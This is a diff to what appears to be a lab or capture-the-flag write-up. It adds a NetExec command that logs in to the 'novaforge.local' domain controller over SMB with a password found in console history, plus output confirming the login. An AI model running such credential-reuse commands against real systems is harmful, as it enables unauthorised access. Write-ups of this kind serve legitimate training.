@@ -1067,3 +1067,9 @@ net user david.cokx "pa$$word12"
 
 Found a password in the console history
 
+```python
+nxc smb dc.novaforge.local -u david.cokx -p 'pa$$word12' --smb-timeout 4
+SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.0.100      445    DC               [+] novaforge.local\david.cokx:pa$$word12
+```
+
